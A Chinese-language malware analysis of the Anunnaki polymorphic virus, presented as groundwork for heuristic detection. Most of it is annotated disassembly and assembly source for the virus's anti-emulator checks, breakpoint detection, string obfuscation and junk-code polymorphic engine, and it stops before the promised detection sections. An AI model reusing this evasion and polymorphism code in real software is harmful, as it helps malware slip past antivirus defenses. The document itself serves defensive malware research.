
# 基于启发式技术检测复杂病毒 Anunnaki

> 原文：[`www.pediy.com/kssd/pediy11/110432.html`](https://www.pediy.com/kssd/pediy11/110432.html)

## 目录
- 0x01. 简介
- 0x02. Anunnaki 变形病毒技术分析
  - 2.1. Anunnaki 特性简介
  - 2.2. Anunnaki 执行流程
  - 2.3. get kernel base address
  - 2.4. anti av-emulator and anti av-heuristic
  - 2.5. polymorphic
    - 2.5.1 Offensive polymorphic engine 功能描述
    - 2.5.2 仿真无效指令设计
    - 2.5.3 poly engine 的实现
  - 2.6. EPO technology 实现
  - 2.7. 感染后文件对比
- 0x03. 防御技术的困境
  - 3.1. 特征码的失效
  - 3.2. 关于主动防御技术
  - 3.3. 关于”云“安全技术
  - 3.4. 关于启发式检测技术
- 0x04. 寻找复杂病毒的漏洞
  - 4.1. 重定位手段
  - 4.2. 跨节区跳转
  - 4.3. 怪异的 macros
  - 4.4. EPO 跟踪
  - 4.5. polymorphic 的不足
  - 4.6. 关于检测
- 0x05. 启发式技术检测 Anunnaki
  - 5.1. 构造仿真器
  - 5.2. 执行时数据的跟踪
  - 5.3. 没有终结的对抗
- 0x06. 其他

## 0x01. 简介

启发式检测技术作为特征检测技术的辅助手段，已经用实践经验证明了是检测病毒的一个成功手段，基于启发式的扫描器最大弱点就是会导致过多的虚警，但在某些方面（如宏病毒，`ani` 格式，`swf` 格式漏洞等方面，加密，变形等），如果缺少启发式检测机制，仅依靠基于特征码技术、主防、”云“技术等 `Aver` 手段将无法完成病毒的完全性检测。

`Anunnaki` 多态病毒是由 `Dark Prophet` 编写的最新病毒，发布日期 `09-10-20`。该病毒的 `payload` 仅弹出一个 `msgbox`，提示”U was infected by almighty Anunnaki“，并没有破坏性的动作。`Anunnaki` 在感染，反虚拟机，变形等方面总结了之前的一些经验，做了一些新的尝试，虽然在 `Anti-emulation` 中并没加入 `vx` 群体最新的研究成果，但仍然有效的跳过了一些 `av` 中的 `sandbox` 检测。下面将在结合 `Anunnaki` 的分析中，完成启发式检测方案。

## 0x02. Anunnaki 变形病毒技术分析

### 2.1 Anunnaki 特性简介

- `Virus type` - 直接感染当前目录下的文件
- `Target files` - `EXE` 文件
- `Target OS` - `Win2k/2003/xp/vista/2008/win7`
- `Infection type` - 添加最后一个节
- `Infection mark` - 不会多重感染
- `Polymorphic`
  - 同样使用了由 `prophet` 自己编写的多态引擎(`Offensive polymorphic engine`)
  - 支持 32bit 滑动密钥(`xor`/`add`/`sub`)
- `EPO`
  - Patch `ExitProcess`/`exit`/`_exit`，支持 `call rel32`/`call dword ptr [mem32]`
- `Payload` - `Message box`
- `Armoured`
  - 反仿真器
  - 检测 `SW` `breakpoints`
  - 通过检测 `api` 调用处是否有 `bpx`，能绕过比较差的 `sandbox`
- `Apis resolving` - 通过 `crc` 校验值方式
- `Other features`
  - 不使用 `Delta offset` 方式重定位
  - 慢随机感染（不是每次都能触发感染替罪羊程序）
  - 最后一个节不设置可写标志 (`anti-heuristic`)
  - 随机插入数据到 `virus body`
  - 使用 `SEH`
  - 可设置垃圾字节数及多态级别，病毒大小可变
- `DEP support` - 在 `DLLCharacteristics` 为 0 时，设置 `Nx_Compatible` 标志
- `ASLR support` - Implicit - neither virus nor decryptors are position dependant
- `SafeSeh support` - 禁用了 `SafeSEH` 使用自定义 `SEH` 处理程序

### 2.2 Anunnaki 执行流程

简化的执行步骤：

- `step 1`: 重定位, 获得当前基址
- `step 2`: 安装 `SEH`
- `step 3`: `anti emulator_1`
- `step 4`: `anti emulator_2`
- `setp 5`: 获得调用的 `APIs`
- `step 6`: 获得 `SFCH` 支持函数
- `step 7`: 搜索当前目录，进行感染
- `step 8`: 执行 `payload`

```
Anunnaki  Flow  Charts  ------.
                                   |
                                   V
                    +------------------+
                    |      重定位       |
                    +------------------+
                                   |
                                   V
                    +------------------+
                    |    安装 SEH      |
                    +------------------+
                                   |
                                   V
                    +------------------+
                    |  anti emulator1   |
                    +------------------+
                                   |
                                   V
                    +------------------+
                    |  初始化病毒 vars   |
                    +------------------+
                                   |
                                   V
                    +------------------+
                    |  anti emulator2    |
                    +------------------+
                                   |
                                   V
                    +------------------+
                    |   get apis        |
                    +------------------+
                                   |
                                   V
                    +------------------+
                    |  get sfc apis     |
                    +------------------+
                                   |
                                   V
                    +------------------+
                    |search current dir|
                    +------------------+
                       /          \\
        +--------.           .----------------+
        |                                |
        V                                V
+---------------------+             +-------------+
|infect file (*.exe)  |             |    exit     |
+---------------------+             +-------------+
        |
        V
+---------------------+
| epo && ope && crypt  |
+---------------------+
        |
        V
+---------------------+
|   exec payload       |
+---------------------+
        |
        V
+---------------------+
|      exit            |
+---------------------+
```

### 2.3 get kernel32 base address

在获得 `kernel32.dll` base address 方面，实用稳定的方式有 3 种：

1. 进程被加载后，`esp` 指向 `kernel32.dll` 空间，搜索该空间即可
2. 遍历 `SEH` 链，当 `prev == -1` 时，该处理异常的 `routine`，在 `kernel32.dll` 的地址空间，搜索该空间即可找到 `kernel` 的 base address。
3. 利用 `fs:[30]` 获得 `PEB`，通过遍历 `InMemoryOrder` 模块列表，直接定位 base address。`Anunnaki` 使用了方案 3。

还有一些稀奇古怪的硬编码方式，缺少通用性。但是作为一种思路，可应用在编写 `shellcode`，检测 `os version`，或是 `SEH` 当中。

**in**: `null`
**out**: `eax` --> `kernel32` 的基址

```
0040159D           |>  60               pushad
0040159E           |.  FC               cld
0040159F           |.  33D2             xor edx,edx
004015A1           |.  64:8B52 30       mov edx,dword ptr fs:[edx+30]          ;  指向 PEB 的指针
004015A5           |.  8B52 0C          mov edx,dword ptr ds:[edx+C]           ;  指向 PEB->_PEB_LDR_DATA
004015A8           |.  8B52 14          mov edx,dword ptr ds:[edx+14]          ;  指向 InMemoryOrder 中第一个模块列表
004015AB           |>  8B72 28          /mov esi,dword ptr ds:[edx+28]         ;  esi 指向模块名称
004015AE           |.  B9 18000000      |mov ecx,18                             ;  按 Unicode 计算 kernel32.dll 的长度为 0x18
004015B3           |.  33FF             |xor edi,edi                             ;  edi 为要计算的模块名称的 hash 值
004015B5           |>  33C0             |/xor eax,eax
004015B7           |.  AC             ||lods byte ptr ds:[esi]                        ;  esi 指向模块名的首地址
004015B8           |.  3C 61           ||cmp al,61                              ;  61 -> 'a'
004015BA           |.  7C 02           ||jl short Anunnaki.004015BE
004015BC           |.  2C 20           ||sub al,20
```



## 2.4 anti av emulator and anti av-heuristic

**I)** 在反仿真器检测方面 `Anunnaki` 并没有使用 `vxer` 群体里面讨论的太多新的技术，采用了 2 种实用的方案：

### 方案 1
利用 `gethostbyname` 的返回值，来测试程序是否运行在仿真环境，其中返回值直接读取 `teb` 中的 `LastErrorValue`，通过校验该值来判断是否直接退出，同类的思路应用于 `NOD32` 这样的级别的 AV 对抗中，仍然有效。原因不在于矛有多锋利，而在于身在明处的盾，只要有耐心总是有漏洞可寻，例如 `NOD32` 对程序执行的时间及相关涉及时间的变形代码很敏感。

`anti_emul_1:`

```
0040169E                     /$  60                  pushad  
0040169F                     |.  6A 00               push 0   
004016A1                     |.  68 61727941         push 41797261   
004016A6                     |.  68 4C696272         push 7262694C   
004016AB                     |.  68 4C6F6164         push 64616F4C   
004016B0                     |.  54                  push esp                 ;  esp -> loadlibraryA  
004016B1                     |.  E8 E5FEFFFF         call Anunnaki.0040159B  ;  get kernel32 base  
004016B6                     |.  50                  push eax  
004016B7                     |.  E8 CCFDFFFF         call <Anunnaki.my_getprocaddress>   
004016BC                     |.  83C4 10             add esp,10             ;  eax -> loadlibrary address  
004016BF                     |.  85C0                test eax,eax  
004016C1                     |.  0F84 91000000       je Anunnaki.00401758  
004016C7                     |.  8BD0                mov edx,eax  
004016C9                     |.  6A 00               push 0  
004016CB                     |.  68 6C6C0000         push 6C6C  
004016D0                     |.  68 33322E64         push 642E3233  
004016D5                     |.  68 7773325F         push 5F327377  
004016DA                     |.  54                  push esp                 ;  esp -> ws2_32.dll  
004016DB                     |.  FFD2                call edx  
004016DD                     |.  83C4 10             add esp,10  
004016E0                     |.  85C0                test eax,eax  
004016E2                     |.  74 74               je short Anunnaki.00401758  
004016E4                     |.  6A 65               push 65  
004016E6                     |.  68 796E616D         push 6D616E79  
004016EB                     |.  68 6F737462         push 6274736F  
004016F0                     |.  68 67657468         push 68746567  
004016F5                     |.  54                  push esp                ;esp->gethostbyname  
004016F6                     |.  50                  push eax  
004016F7                     |.  E8 8CFDFFFF         call <Anunnaki.my_getprocaddress>  
004016FC                     |.  83C4 10             add esp,10  
004016FF                     |.  85C0                test eax,eax  
00401701                     |.  74 55               je short Anunnaki.00401758  
00401703                     |.  8BF8                mov edi,eax  
00401705                     |.  6A 00               push 0  
00401707                     |.  68 6F6D0000         push 6D6F  
0040170C                     |.  68 6C652E63         push 632E656C  
00401711                     |.  68 676F6F67         push 676F6F67  
00401716                     |.  54                  push esp               ;esp->"google.com"   
00401717                     |.  FFD7                call edi               ;call -> gethostbyname("google.com")  
00401719                     |.  83C4 10             add esp,10  
0040171C                     |.  64:A1 34000000      mov eax,dword ptr fs:[34] ; 从 teb 中读取 GetLastError 数值给 eax   
00401722                     |.  69C0 01000100       imul eax,eax,10001  
00401728                     |.  35 58862413         xor eax,13248658  
0040172D                     |.  3D 35A14934         cmp eax,3449A135          ; 校验返回值  
00401732                     |.  74 24               je short Anunnaki.00401758  
00401734                     |.  6A 00               push 0  
00401736                     |.  68 65737300         push 737365  
0040173B                     |.  68 50726F63         push 636F7250  
00401740                     |.  68 45786974         push 74697845  
00401745                     |.  54                  push esp                ; esp->ExitProcess  
00401746                     |.  E8 50FEFFFF         call Anunnaki.0040159B  
0040174B                     |.  50                  push eax  
0040174C                     |.  E8 37FDFFFF         call <Anunnaki.my_getprocaddress>  
00401751                     |.  83C4 0C             add esp,0C  
00401754                     |.  6A 00               push 0  
00401756                     |.  FFD0                call eax                
00401758                     |>  61                  popad  
00401759                     \\. C3                  retn  
```

### 方案 2
利用仿真器一般不会仿真处理 `SSE` 指令这里特点来判断是否运行于仿真环境中，这点其实对 `AV-emulator` 来说很容易补上，关键在于当你想到时，已经晚了一步，所以 `aver` 得继续努力跟进。

`anti_emul_1:`

```
00401757       |?  50               push eax  
00401758       |>  0F2FC0           comiss xmm0,xmm0     ;比较低位数并且设置标识位  
0040175B       |.  33C0             xor eax,eax  
0040175D       |?  0F2AC0           cvtpi2ps xmm0,mm0    ;32 位整数转变为浮点数  
00401760       |.  58               pop eax  
00401761       |?  C3               retn  
00401762       |?  56               push esi  
```

**II)** 在反启发式检测方面，`Anunnaki` 很注意在 `stack` 中的数据的隐藏，绝不在 `stack` 及 `code` 中出现有含义的数据，这样使得特征扫描，及通配符匹配，不相等字符匹配等等检测方式失效，例如，对 `bpx` 的检测：

`detect_bpx:`

```
00401762         56                push esi  
00401763         51                push ecx  
00401764         8BF0              mov esi,eax  
00401766         B9 05000000       mov ecx,5  
0040176B         33C0              xor eax,eax  
0040176D         AC                lods byte ptr ds:[esi]  
0040176E         35 99000000       xor eax,99  
00401773         83F8 55           cmp eax,55               ; -- av 跳过  
00401776         74 24             je short Anunnaki.0040179C  
00401778         83F8 54           cmp eax,54               ; -- av 跳过  
0040177B         74 1F             je short Anunnaki.0040179C  
0040177D         83F8 09           cmp eax,9                ; -- av 跳过  
00401780         74 1A             je short Anunnaki.0040179C  
00401782         83F8 71           cmp eax,71               ; -- av 跳过  
00401785         74 15             je short Anunnaki.0040179C  
00401787         83F8 70           cmp eax,70               ; -- av 跳过  
0040178A         74 10             je short Anunnaki.0040179C  
0040178C         83F8 63           cmp eax,63               ; -- av 跳过  
0040178F         74 0B             je short Anunnaki.0040179C  
00401791         83F8 62           cmp eax,62               ; -- av 跳过  
00401794         74 06             je short Anunnaki.0040179C  
00401796         ^ E2 D3           loopd short Anunnaki.0040176B  
00401798         33C0              xor eax,eax  
0040179A         EB 03             jmp short Anunnaki.0040179F  
0040179C         33C0              xor eax,eax  
0040179E         40                inc eax  
0040179F         59                pop ecx  
004017A0         5E                pop esi  
004017A1         C3                retn  
```



# 病毒代码混淆与多态引擎分析

## 0x55, 0x54, 0x09, 0x71, 0x70, 0x63, 0x62 的混淆原理

以上的比较值 `0x55`, `0x54`, `0x09`, `0x71`, `0x70`, `0x63`, `0x62` 时, 几乎不会引起任何 `scanner` 的警觉，但当上述值与 `0x99` 做 `xor` 操作后，即明白是检测 `bpx` 的操作。

```
0x55 xor 0x99 - >  0xcc (int 3)

0x54 xor 0x99 - >  0xcd (int 0)

0x09 xor 0x99 - >  0x90 (nop)

0x71 xor 0x99 - >  0xe8 (call rel32)

0x70 xor 0x99 - >  0xe9 (jmp rel32)

0x63 xor 0x99 - >  0xfa (cli)

0x62 xor 0x99 - >  0xfb (sti)
```

类似的应用还有在 `stack` 中压入字符串操作，我们可以看到 `bin` 中的所有字符串操作都是采用下面的手法:

```
.text:00401705 6A 00           push    0

.text:00401707 68 6F 6D 00 00 push    6D6Fh           --- > 'mo'

.text:0040170C 68 6C 65 2E 63 push    632E656Ch        --- > 'c.el'

.text:00401711 68 67 6F 6F 67 push    676F6F67h        --- > 'goog'

.text:00401716 54             push    esp              --- > 'gogle.com'

.text:00401717 FF D7          call    edi              --- >  call gethostbyname

.text:00401108 6A 00          push    0

.text:0040110A 68 65 73 73 00 push    737365h          --- > 'sse'

.text:0040110F 68 50 72 6F 63 push    636F7250h        --- > 'corP'

.text:00401114 68 45 78 69 74 push    74697845h        --- > 'tixE'

.text:00401119 54             push    esp              --- >  call ExitProcess
```

这样 `av` `scanner` 都会认为压入的是数值而忽略了该方式的检测。

## 2.5 Polymorphic engine

### 2.5.1 Offensive polymorphic engine 功能描述

在进行感染前，`Anunnaki` 会在病毒体前后，随机洒满垃圾数据，这样 `virus` `body` 就具有可变大小，更重要的是夹杂在垃圾数据间的 `code`, 看起来更像是一个数据段，极具迷惑作用。`ope` 是一个复杂的可配置的多态引擎，根据需求提供不同的可变代码生成机制，但该引擎并没有完全写完，还有一些高级功能未完成，但这不影响在编写 `virus` 中的应用。可以看到，感染后的数据情况，`virus` `body` 前后都套了不同层数的保护（垃圾数据及仿真的无效指令）, 在此基础上进行数据的多态变形。

```
buffer---> +-----------------------------+        buffer------>

   |       |  +----------------------+   |        .---------->  +---------------------------+
   |       |  | Gen trash data       |   |        /             |cryptor buff by buf_len    |
   |       |  +----------------------+   |       /              +---------------------------+
   |       |            |                |      /                          |
   |       |            V                |     /                           V
   |       |  +----------------------+   |    /             +---------------------------+
   |       |  |emulator  instruction  |   |   /             |set decryptor instruction  |----.
   |       |  +----------------------+   |  /               +---------------------------+    |
   |       |            |                | / 进行数据的多态变形                |                 |
   V       |            V                |                                 V                 |
  buf_len  |  +----------------------+   |                         +---------------------------+    |
   A       |  |     virus body       |   |                         |insert emulator  instruction|    |loop 不断在 decryptor 中
   |       |  +----------------------+   |                         +---------------------------+    |夹杂混淆干扰数据
   |       |  |           |              |                                     |                    |
   |       |  |           V              |                                     V                    |
   |       |  +----------------------+   |                         +---------------------------+    |
   |       |  | Gen trash data       |   |                         |set decryptor instruction  |    |
   |       |  +----------------------+   |                         +---------------------------+ <---.
   .------ +-----------------------------+                                     |
                                                                                     V

                                                                 +---------------------------+
 finish-->    |     confused code        |
             +---------------------------+
```

在经过 `polyengine` 处理后，`ope` 支持在该层数据上继续进行多态变形处理。

```
mov eax,VIRUS_POLY_LAYERS_MAX; 最大默认为 3 层
call rand
test eax,eax
jz @f

mov ecx,eax

CreateLayer:
   mov eax,ebx
   call PolyEngine
   ;... 重新设置入口偏移
   loop CreateLayer

@@:
   ；...
```

理论上层数越多越难处理，但实际效果上层数不易过多，否则影响程序执行效率。

### 2.5.2 仿真无效指令设计

早期的多态引擎在无效指令方面设计的较为简单，利用 1 字节，2 字节，3 字节，等无效指令插入真正的代码当中，来达到混淆数据的目的。1990 年，`mark` 编写的 `1260` 病毒，是最早引入该机制的病毒。

在代码中随机插入 1 字节指令:
```
inc si \ dec si \ clc \ nop
```

插入 2 字节指令:
```
sub bx, bx \ xor bx,cx \ div ax
```

插入 3 字节指令:
```
add bx,0 \ add cx,0
```

这些技术都曾对特征检测制造过很大麻烦。随着 `av` 研究的深入，只要静态检测配合一个反汇编器，就可解决掉 `1260` 这样简单的多态病毒。但这一思路一直保持着到今天多态引擎设计当中。`GyiYo/29A` 的基于 `win32` 平台 `hps` 多态引擎继续给 `av` 制造难题，使用了高度结构化的解码器同时支持指令乱序，但很重要一点就是当它产生 `junk` 时，你不仔细分析，将认为这就是正常的程序代码。`ope` 引擎同样非常优秀，产生的无效指令一样使人看起来很真实，并不像垃圾指令。下面分析仿真无效指令的设计。

#### I) 寄存器的使用说明

定义寄存器的索引值：
```
enum { eax = 0,ecx,edx,ebx,esp,ebp,esi,edi };
```

#### II) 设置要使用的寄存器

设置 `esp`，`ebp` 作为使用的寄存器。

```
00402621 <Anunnaki.set_reg_32>        /$  50                  push eax  ;eax 为要设置的寄存器索引
00402622                              |.  E8 E5FFFFFF          call <Anunnaki.convert_32>
00402627                              |.  3145 58              or  dword ptr ss:[ebp+58],eax ;将 0x00000010 保存到 poly_vars.poly_reg_usage
0040262A                              |.  58                   pop eax

0040260C <Anunnaki.convert_32>        /$  51                   push ecx
0040260D                              |.  8BC8                 mov ecx,eax ； 如 eax = 4；
0040260F                              |.  33C0                 xor eax,eax
00402611                              |.  40                   inc eax
00402612                              |.  D3C0                 rol eax,cl
00402614                              |.  59                   pop ecx     ； 最后的结果为 eax = 0x00000010
```

`unset_reg_32`（取消使用的寄存器）原理和这个类似，仅差一条语句，不再赘述：
```
xor  dword ptr ss:[ebp+58],eax ; 消除要取消的寄存器标志位。
```

#### III) 无效指令的生成

`ope` 支持产生最大值为 5 的一个自定义过程调用，初始化时，将在 `buff` 中产生子过程调用的代码，支持如下方式代码的产生:

```
POLY_FLAG_IN_LOOP  equ  1 ; in loop
POLY_FLAG_IN_SUBR  equ  2 ; in subroutine
POLY_FLAG_IN_PRED  equ  4 ; in predicate
```

随机产生递归的深度，来控制产生无效指令的多少，这里 `Prophet` 还预留了产生 `API` 调用，但目前还未完成该功能，如果不追求 `metamorphic` 的复杂与巨大的体积，智能化的 `Polymorphic` 将继续是对抗的热点所在，而且会不断的给 `av` 制造麻烦。

```
00402194 <Anunnaki.junk>/$  60            pushad
00402195             |.  8BE8            mov ebp,eax
00402197             |.  E8 20000000     call <Anunnaki.PolyInit>             ; 初始化设置前面提到的寄存器
0040219C             |.  E8 32FAFFFF     call <Anunnaki.PolyGarbleInit>      ; 初始化多态设置及何种的子过程调用
004021A1             |.  8B7D 14         mov edi,dword ptr ss:[ebp+14]       ; PolyCreateGarbage
004021A4             |.  8BC7            mov eax,edi                         ; edi -> 填充无效指令的位置
004021A6             |.  85C9            test ecx,ecx
004021A8             |.  74 10           je short Anunnaki.004021BA
004021AA <Anunnaki.junk>|>  E8 4BFAFFFF  /call <Anunnaki.PolyGarble>         ;循环填写仿真的无效指令
004021AF             |.^ E2 F9           \loopd short <Anunnaki.PolyGarble>
004021B1             |.  2BF8            sub edi,eax
004021B3             |.  897D 1C         mov dword ptr ss:[ebp+1C],edi
004021B6             |.  897C24 1C       mov dword ptr ss:[esp+1C],edi
004021BA             |>  61              popad
004021BB             \\.  C3             retn
```

#### IV) 随机无效指令派发

能产生 `push`/`pop`  `loop`  `call` `jump` 等这些类型的指令。

```
00401C1C         $   B8 21000000       mov eax,21                       ;  21 是随机种子，包含最大的产生无效指令类型
```



```
00401C21               .  E8 B30A0000       call <Anunnaki.random>             ; 随机获得一种类型，产生不同类型指令  
00401C26               .  83F8 07          cmp eax,7                         ; 产生 PUSH_POP;  
00401C29               .  72 38            jb short Anunnaki.00401C63
00401C2B               .  83E8 07          sub eax,7  
00401C2E               .  83F8 05          cmp eax,5                         ; 产生 PREDICATE
00401C31               .  72 29            jb short Anunnaki.00401C5C  
00401C33               .  83E8 05          sub eax,5  
00401C36               .  83F8 02          cmp eax,2                         ; 产生 LOOP  
00401C39               .  72 1A            jb short Anunnaki.00401C55  
00401C3B               .  83E8 02          sub eax,2  
00401C3E               .  83F8 02          cmp eax,2                         ; 产生 CALL  
00401C41               .  72 30            jb short Anunnaki.00401C73  
00401C43               .  83E8 02          sub eax,2  
00401C46               .  83F8 05          cmp eax,5  
00401C49               .  72 21            jb short Anunnaki.00401C6C  
00401C4B               .  83E8 05          sub eax,5                         
00401C4E               .  E8 7E030000      call <Anunnaki.Garble_Create_Modrm>    ;产生内存寻找方式  
00401C53               .  EB 23            jmp short Anunnaki.00401C78  
00401C55               >  E8 A8000000      call <Anunnaki.Garble_Loop>          ;循环结构  
00401C5A               .  EB 1C            jmp short Anunnaki.00401C78  
00401C5C               >  E8 22000000      call <Anunnaki.Garble_Predicate>     ;产生一个不透明谓词（暂且这样称呼，主要是修改 jmp 为条件  
00401C61               .  EB 15            jmp short Anunnaki.00401C78          ;跳转，但执行时条件永远为真）  
00401C63               >  E8 73000000      call <Anunnaki.Garble_Push_Pop>      ;产生 push/pop  
00401C68               .  EB 0E            jmp short Anunnaki.00401C78  
00401C6A               .  EB 0C            jmp short Anunnaki.00401C78  
00401C6C               >  E8 EF030000      call <Anunnaki.Garble_Create_Imm>     ;产生 imm 方式  
00401C71               .  EB 05            jmp short Anunnaki.00401C78  
00401C73               >  E8 18010000      call <Anunnaki.Garble_Sub_Call>      ;产生 call  
00401C78               >  85C9             test ecx,ecx  
00401C7A               .  74 06            je short Anunnaki.00401C82  
00401C7C               .  49               dec ecx  
00401C7D               .  E8 9AFFFFFF      call <Anunnaki.Garble>  
00401C82               >  C3               retn  
```

## V) 各种指令的构造原理

随机产生各种寄存器的情况下，根据每一种指令的特点，产生不同寄存器的不同寻址方式，下面做简要说明，`rx`（表示任意一个可使用的寄存器）。

### 1. `push`
可产生 `push xxxx` / `push rx` / `push [rx + xxxxx]` 方式。

#### a) 立即数寻找方式
```
Garble_Push_Imm:       mov eax,2
    call random
    push ebx
    mov ebx,eax
    rol eax,1
    add eax,68h
    stosb
```

#### b) `push` 随机寄存器方式
```
Garble_Push_Reg32:     call get_reg_32 ; 返回 0 ~ 8 的寄存器索引
    add al,50h
    stosb
    retn
```

#### c) `push` 内存寻址方式
```
Garble_Push_Modrm:     mov al,0ffh
    stosb
    push edi
    call Garble_Create_Modrm_Byte
    pop eax
    and byte ptr [eax],11000111b  ; 2(11):3(000):3(111)  -> 2(11) -> [reg + rm]   
    add byte ptr [eax],6 SHL 3
    retn
```

### 2. `imm` 方式
```
Garble_Create_Imm:
    push ebx
    call get_free_reg_32_no_set   ;获得一个不被使用的寄存器,从 poly_vars->poly_reg_usage 获得
    mov ebx,eax                   ;并重新设置相关位
    cmp eax,-1
    je Garble_Create_Imm_E
    mov eax,5
    call random
    test eax,eax
    jz Garble_Imm_Init_Ptr       
    cmp eax,1
    jbe Garble_Imm_Inc_Dec       
    mov eax,0b8h                 ;产生一个 mov rx， (ebx 存放具体不能被使用的寄存器索引数值)
    add eax,ebx
    stosb
    mov eax,-1                   ;设置一个 32bit 最大值
    call random
    stosd                        ;将 4byteimm 写入内存，形成 mov rx，imm
    pop ebx
    retn
```
同理还可以产生 `sub rx` / `inc rx` / `dec rx` 等等方式操作。

### 3. `mod/rm` 方式

**步骤:**
1. 产生一个随机数，判断是否要有 `0x66` 前缀
2. 获得当前能用的寄存器标志，如果不等于 `0`，则产生 `add` / `or` / `and` / `sub` / `xor` / `mov` 指令，否则跳向步骤 3
3. 没有可选寄存器，调用 `Garble_Create_Modrm_Byte`，生成 `mov rx,rx` 等指令。

对于没有寄存器可用的情况下，如何生成不影响当前代码的指令，`ope` 使用的简洁的一个方案，那就是一律产生 `mov r1，r1`（`r1` 指相同的寄存器）类指令，具体方式，向缓冲区写入 `0x89` (`opcode -> mov`)。

`opcode format` 结构如下：
```
+----------+---------+---------+--------+-------------+----------+
|prefixes  | opcode  |Mod/rm   |sib     |displacement |immediate |
+----------+---------+---------+--------+-------------+----------+
             |  0x89   |
             +---------+
```

可以看出，要产生 `mov r1，r1` 指令，关键是 `mod/rm` 域中要填入的合适的值。`mod/rm` 域用于指出寻址方式，包括内存寻址及寄存器寻址，`mod/rm` 占 1 字节，按 `2![](img/cb6288ad81b189b02921e98a92da6abe.jpg "124.gif")3 bit` 解析。当 `m1` 可表示 4 种寻址模式，当 `m1 == 11` 时表示寄存器到寄存器，（`m2`，`m3`）占 `3bit`，表示 8 种寄存器。故只要保证 `m2`，`m3` 数值相同，逻辑或 `0xc0` 即可。

```
               m1         m2       m3
mod/rm ->  +--------+---------+--------+
           |  11     |   00    |   00   |      ----> 0xc0
           +--------+---------+--------+
```

其他类型指令的产生与上述情况类似，涉及 `mod/rm` `sib` `displacement` `immediate` 格式的解析，生成不同指令，不再赘述。

**具体的变形代码如下:**

```
Garble_Create_Modrm_Byte:
  push ebx                 ; 保存 poly_vars 结构           
  call get_free_reg_32_no_set ;获得一个未使用的寄存器索引
  cmp eax,-1
  je Modrm_reg1_reg1       ;  没有可用寄存器
  rol eax,3
  mov ebx,eax
  mov eax,5
  call random
  test eax,eax
  jz Modrm_Reg_Reg       
  cmp eax,3
  jb Modrm_Stack_Read      
Modrm_Mem_Acc:          
  mov eax,3   
  call random
  test eax,eax
  jz Modrm_Mem_Direct
  cmp dword ptr [ebp].poly_junk_mem_pos,0
  je Modrm_Mem_Direct         
Modrm_Mem_AccNoDisp:     
  mov eax,dword ptr [ebp].poly_junk_mem_reg
  add eax,ebx
  stosb
  mov eax,dword ptr [ebp].poly_read_mem_size
  sub eax,4
  call random  
  add eax,dword ptr [ebp].poly_read_mem_base
  mov ebx,eax
  sub ebx,dword ptr [ebp].poly_junk_mem_pos
  mov eax,6  
  call random
  cmp eax,0
  je Modrm_Mem_Disp32
  cmp eax,4
  jb Modrm_Mem_Disp8
  pop ebx
  retn  
Modrm_Mem_Disp8:     
  add byte ptr [edi - 1],40h
  mov byte ptr [edi],bl
  inc edi
  pop ebx
  retn
Modrm_Mem_Disp32:         
  add byte ptr [edi - 1],80h
  mov dword ptr [edi],ebx
  add edi,4   
  pop ebx
  retn  
Modrm_Mem_Direct:       
  mov eax,dword ptr [ebp].poly_options
  and eax,POLY_OPT_MEM_ACC_DIRECT
  test eax,eax
  jnz Modrm_Stack_Read
  cmp dword ptr [ebp].poly_read_mem_base,0
  je Modrm_Stack_Read
  mov eax,5
  add eax,ebx
  stosb  
  mov eax,dword ptr [ebp].poly_read_mem_size
  call random
  add eax,dword ptr [ebp].poly_read_mem_base
  stosd            
  jmp Modrm_End        
Modrm_Stack_Read:         
  mov eax,ebx
  add eax,45h
  mov byte ptr [edi],al         
  mov eax,2
  call random
  test eax,eax
  jz Modrm_Stack_Ebp           
  mov byte ptr [edi + 1],24h
  sub byte ptr [edi],1
  inc edi
Modrm_Stack_Ebp:           
  inc edi
  mov eax,POLY_ESP_ACC_RNG_MAX  
  call random  
  imul eax,4           
  mov ebx,eax
  mov eax,2 ; +/- disp
  call random
  test eax,eax 
  jz Modrm_Stack_DispPos           
  xor eax,eax
  sub eax,ebx
Modrm_Stack_DispPos:       
  mov byte ptr [edi],al
  inc edi           
  jmp Modrm_End
```



### `Modrm_Reg_Reg`

```
    call get_reg_32_no_stack;产生 mov r1，r2   
    add eax,ebx ; free reg  
    add eax,0c0h  
    stosb  
    jmp Modrm_End  
```

### `Modrm_reg1_reg1`

```
    call get_reg_32 ; 产生 mov r1/r1  
    mov ah,al  
    rol al,3  
    add al,ah  
    add al,0c0h  
    stosb               
```

### `Modrm_End`

```
    pop ebx  
    retn  
```

### 4. `sub_call` 方式

1. 检测配置中 `poly_subroutines_count` 是否为 0？是 0 则退出，否则步骤 2
2. 检测配置中是否设置 `subroutine` 标志，没设置退出
3. 检测 `poly_subroutines_table` 中是否参数标志，因为产生的 `call` 是按 `__cdecl` 方式压栈的
4. 如果是有参数的情况，负责清栈。
5. 调用 `Garble_Create_Push`，产生不同类型的 `push 32_bit` / `push 8_bit` / `push rx` / `push [rx + rx]`
6. 生成 `call` 指令

### `Garble_Sub_Call`

```
    push ecx  
    push ebx  
    cmp dword ptr [ebp].poly_subroutines_count,0   ; 检测是否设置的 sub_call 方式  
    je Garble_Sub_Call_End  
    call Is_In_Subr ;   
    test eax,eax  
    jnz Garble_Sub_Call_End  
    mov eax,dword ptr [ebp].poly_subroutines_count ;读取计数  
    call random  
    lea eax,[eax * 8]  
    lea ebx,[ebp].poly_subroutines_table  
    add ebx,eax  
    cmp dword ptr [ebp].poly_junk_mem_pos,0        ; 比较是否初始化 junk 内存数据  
    je Garble_Sub_No_Save1  
    mov ecx,dword ptr [ebp].poly_junk_mem_reg  
    add ecx,50h  
    mov byte ptr [edi],cl ;   
    inc edi  
```

### `Garble_Sub_No_Save1`

```
    mov ecx,dword ptr [ebx + 4] ;     
    test ecx,ecx  
    jz Garble_Sub_No_Arg                        ;生成无参数 call 指令  
```

### `Garble_Sub_Arg`

```
    call Garble_Create_Push  
    loop Garble_Sub_Arg  
```

### `Garble_Sub_No_Arg`

```
    mov eax,dword ptr [ebx]  
    sub eax,edi  
    sub eax,5  
    mov byte ptr [edi],0e8h  
    inc edi  
    stosd        
    mov eax,dword ptr [ebx + 4] ;   
    test eax,eax  
    jz Garble_Sub_No_Save2  
    imul eax,4  
    rol eax,16  
    add eax,9000c483h        ； 产生 sub esp , xxxx,清空堆栈                 
    stosd  
    dec edi  
```

### `Garble_Sub_No_Save2`

```
    cmp dword ptr [ebp].poly_junk_mem_pos,0  
    je Garble_Sub_Call_End  
    mov eax,dword ptr [ebp].poly_junk_mem_reg  
    add eax,58h  
    stosb ;         pop rx          
```

### `Garble_Sub_Call_End`

```
    pop ebx  
    pop ecx  
    retn  
```

### 5. `loop` 方式

